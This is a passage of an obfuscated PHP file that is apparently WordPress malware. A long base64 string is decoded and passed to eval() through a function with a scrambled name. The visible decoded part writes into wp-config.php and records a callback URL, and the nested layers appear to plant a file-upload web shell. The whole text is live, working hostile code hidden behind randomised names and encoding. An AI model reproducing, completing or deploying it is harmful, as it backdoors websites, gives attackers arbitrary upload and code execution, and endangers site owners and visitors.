lqTjRJaWw3SkdaMWJtTTlJbU55SWk0aVpXRWlMaUowWlY4aUxpSm1kVzRpTGlKamRHbHZiaUk3SkhnOUpHWjFibU1vSWx3a1l5SXNJbVVpTGlKMklpNGlZV3dpTGlJb0p6OCtKeTVpWVhObElpNGlOalFpTGlKZlpHVmpJaTRpYjJSbEtGd2tZeWtwT3lJcE95UjRLQ0pRUkRsM1lVaEJTME5wVW0xaFYzaHNZM2xCT1VsRlFXdFlNRnBLVkVWV1ZGZDVTbTFoVjNoc1kzbEtaRTkzY0hCYWFVRnZTa2RhY0dKSFZucFhlVXAxV1ZjeGJFbHNNR2RKVkRCblNubGpjRWxJYzB0SlEwRm5TVU5TYldSWGVITmpSMFl3WVVOQk9VbERVbVpWYTFaU1ZsVldWRlpHYzJsalIwWXdZVU5LWkVsRE5HZEtSMXB3WWtkV2VsZDVTblZaVnpGc1NXd3dOME5wUVdkSlEwSndXbWxCYjJKWE9USmFWamt4WTBkNGRsbFhVbXhhUmpsdFlWZDRiRXREVW0xaFYzaHNZekZ6Ym1SSE1YZFlNalZvWWxkVmJsaFRkMmRLUjFveFlrZDRkMWxZVW05TFUydG5aWGR2WjBsRFFXZEpRMEZuU1VkV2FtRkhPR2RKYW5odlRWUTBPRmxUUW05amJWWnRVRk5qYTFwdVZuTmlTRUpvWkVkbmJsQnJVblppYlZWb1NVVTVkMXBYTkRoTU1rVXJVRU01YjAxVU5HbFBkMjluU1VOQloyWlJjRGxhVjA1dllubEJibEJIYURCaVYzY3JVRWRvYkZsWFVTdFFTRkp3WkVkNGJGQnNWbmRpUnpsb1drTkNiV0ZYZUd4amVUUjFUR3AzZG1SSGJEQmlSMVVyVUVNNWIxcFhSbXRRYW5ocFlqSlNOVkJxZUcxaU0wcDBTVWN4YkdSSGFIWmFSREZSVkRGT1ZVbEhWblZaTTFJMVkwZFZPVWx0TVRGaVNGSndZMGRHZVdSRE9XMWlNMHAwVEZkU2FHUkhSV2xKUjBacVpFZHNkbUpxTUdsSmFqUTRZVmMxZDJSWVVXZGtTR3gzV2xReE1GcFlhREJKUnpWb1lsZFZPV05IUmpCaFJEUTRZVmMxZDJSWVVXZGtTR3gzV2xRd2FWcHRiSE5hVTBsblltMUdkRnBVTUdsYWJXeHpXbGhOYVZCcWVIQmlia0l4WkVOQ01HVllRbXhRV0U0eFdXMHhjR1JEUWpKWlYzZ3hXbFF3YVZaV1FuTmlNa1pyU1dvME9Fd3lXblpqYlRBclVFTTVhV0l5VWpWUWFuZDJZVWhTZEdKRU5HNVBkMjh2VUdjOVBTSXBPMlY0YVhRN2ZUOCsiKSk7DQogICAgICBmd3JpdGUoJG9wd3Bjb24sJHdwY29uZmlnKTsNCiAgICAgIGZjbG9zZSgkb3B3cGNvbik7DQogICAgICAkd3Bjb25maWdiYWNrPSRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIvd3AtY29uZmlnLnBocD8zeD0zeCI7DQogICAgfQ0KICB9DQp9";

function DIoKFoJOmAiOTWPIbGgWfnPvfrmazMvgFaMbcUWMyoNUFvtJke($DGcCGcnoUgtVaWfLtwuPTMcIhNJjPTNaOSgeATqSuGtUzXsdwl) {
    $YGiFVTTtVuRyhIfJgMwngzauIQFXwJjjLUJXefMoGoRSvaQrgb = base64_decode($DGcCGcnoUgtVaWfLtwuPTMcIhNJjPTNaOSgeATqSuGtUzXsdwl);
    return $YGiFVTTtVuRyhIfJgMwngzauIQFXwJjjLUJXefMoGoRSvaQrgb;
}
$GaXhRvOgoRMotXuEtaCywgbAxPabpfQwiYkkAdHsCJNFXUknBd = $DiSaMdZFJBvKzmBUDuMnYjTCekhVgxEouNumNzaxUkJJtJuvhM;
eval(DIoKFoJOmAiOTWPIbGgWfnPvfrmazMvgFaMbcUWMyoNUFvtJke($GaXhRvOgoRMotXuEtaCywgbAxPabpfQwiYkkAdHsCJNFXUknBd));
?>